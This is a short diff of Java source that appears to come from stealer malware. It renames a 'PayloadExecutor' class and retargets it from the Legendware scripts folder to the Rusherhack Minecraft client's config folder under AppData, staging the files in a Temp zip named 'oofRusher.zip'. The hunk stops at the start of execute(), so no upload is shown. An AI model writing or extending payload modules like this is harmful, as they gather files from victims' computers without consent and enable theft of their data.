@@ -10,15 +10,14 @@ import java.util.Optional;
 
 /**
  * @author Peter
- * @since 09/13/2022
- * Gets Legendware's script folder(since it uses configs from the cloud).
+ * @since 10/09/2022
+ * Gets Rusherhack's configs.
  */
-
-public class LegendwareScripts implements PayloadExecutor {
+public class RusherhackConfigs implements PayloadExecutor {
     Main main = new Main();
 
-    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Legendware\\Scripts";
-    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofLegend.zip";
+    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\rusherhack";
+    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofRusher.zip";
 
     @Override
     public void execute() throws Exception {
